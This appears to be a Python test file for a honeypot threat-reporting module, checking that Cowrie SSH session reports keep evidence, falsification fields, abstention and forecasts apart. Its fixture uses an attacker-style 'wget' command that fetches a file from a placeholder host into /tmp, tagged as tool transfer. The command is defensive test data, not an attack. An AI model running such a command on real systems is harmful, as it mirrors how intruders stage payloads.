from __future__ import annotations

import copy

from production.reporting.threat_hypothesis import attach_model_prediction, build_v2_report


def _transfer_report() -> dict:
    command = "wget https://example.invalid/a -O /tmp/a"
    timestamp = "2026-07-20T01:00:00Z"
    classification = {
        "command": command,
        "original_command": command,
        "ttp": "T1105",
        "tactic": "command-and-control",
        "source": "rule",
        "high_confidence": True,
        "evidence_id": "classification-transfer",
        "event_timestamp": timestamp,
        "cowrie_eventid": "cowrie.command.input",
    }
    raw_events = [
        {
            "session": "assessment-v3",
            "timestamp": timestamp,
            "eventid": "cowrie.command.input",
            "input": command,
        },
        {
            "session": "assessment-v3",
            "timestamp": "2026-07-20T01:00:01Z",
            "eventid": "cowrie.session.file_download",
            "url": "https://example.invalid/a",
            "outfile": "/tmp/a",
            "shasum": "a" * 64,
        },
    ]
    payload = {
        "session_id": "assessment-v3",
        "commands": [command],
        "classification_events": [classification],
        "raw_events": raw_events,
    }
    return build_v2_report({}, [payload], raw_events=raw_events)


def test_v3_is_additive_and_preserves_canonical_evidence() -> None:
    report = _transfer_report()
    v3 = report["session_assessment_v3"]

    assert report["schema_version"] == "threat_hypothesis.v2"
    assert v3["schema_version"] == "session_assessment.v3"
    assert v3["compatibility"] == {
        "threat_hypothesis_v2_preserved": True,
        "historical_reports_recomputed": False,
    }
    assert v3["evidence"]["observations"] == report["observed_behavior"]["ordered_command_observations"]
    assert v3["evidence"]["entities"] == report["observed_behavior"]["normalized_entities"]
    assert v3["evidence"]["relationships"] == report["observed_behavior"]["behavior_relationships"]
    assert v3["source_scope"]["scope"] == "single_cowrie_ssh_session"


def test_v3_claims_have_explicit_support_and_falsification_fields() -> None:
    v3 = _transfer_report()["session_assessment_v3"]
    claims = v3["assessment"]["claims"]

    assert claims
    assert all(claim["supporting_evidence_refs"] for claim in claims)
    assert all(claim["assumptions"] for claim in claims)
    assert all(claim["limitations"] for claim in claims)
    assert all(claim["falsification_conditions"] for claim in claims)
    assert all(isinstance(claim["counterevidence"], list) for claim in claims)
    assert all(isinstance(claim["information_gaps"], list) for claim in claims)
    assert {claim["lifecycle_state"] for claim in claims}.issubset(
        set(v3["hypothesis_management"]["lifecycle_states"])
    )


def test_v3_has_bounded_alternatives_and_separates_context_and_forecast() -> None:
    report = _transfer_report()
    v3 = report["session_assessment_v3"]
    hypothesis_sets = v3["hypothesis_management"]["hypothesis_sets"]

    assert len(hypothesis_sets) == 1
    assert len(hypothesis_sets[0]["hypotheses"]) == 2
    assert hypothesis_sets[0]["alternatives_are_exhaustive"] is False
    assert hypothesis_sets[0]["alternatives_are_mutually_exclusive"] is False
    assert v3["enrichment"]["separation_semantics"] == "context_only_not_behavioral_claim_evidence"
    assert "statistical_forecast_not_observed_evidence" in (
        v3["next_tactic_forecast"]["separation_semantics"]
    )


def test_attaching_prediction_changes_only_v3_forecast_section() -> None:
    report = _transfer_report()
    original = copy.deepcopy(report["session_assessment_v3"])
    updated = attach_model_prediction(report, {
        "snapshot_id": "snapshot-v3",
        "generated_at": "2026-07-20T01:00:02Z",
        "final_ranking": [{
            "tactic": "execution",
            "confidence": "possible",
            "score": 0.7,
            "reasons": ["separately evaluated transition evidence"],
        }],
    })
    current = updated["session_assessment_v3"]

    for key in original:
        if key != "next_tactic_forecast":
            assert current[key] == original[key]
    assert current["next_tactic_forecast"]["status"] == "available"
    assert current["next_tactic_forecast"]["forecast"]["next_tactic_ranking"][0]["tactic"] == "execution"


def test_v3_abstains_without_inventing_alternatives() -> None:
    report = build_v2_report({}, [{
        "session_id": "assessment-v3-empty",
        "commands": [],
        "classification_events": [],
        "raw_events": [],
    }])
    management = report["session_assessment_v3"]["hypothesis_management"]

    assert management["abstained"] is True
    assert management["hypothesis_sets"] == []
    assert management["abstention_reason"]


def test_historical_v2_without_v3_is_not_silently_recomputed() -> None:
    historical = {
        "schema_version": "threat_hypothesis.v2",
        "session_id": "historical-v2",
        "observed_behavior": {"session_id": "historical-v2"},
        "model_prediction": {"status": "unavailable"},
    }
    updated = attach_model_prediction(historical, {
        "snapshot_id": "later-snapshot",
        "final_ranking": [{
            "tactic": "execution",
            "confidence": "possible",
            "score": 0.5,
        }],
    })

    assert "session_assessment_v3" not in updated
    assert updated["schema_version"] == "threat_hypothesis.v2"
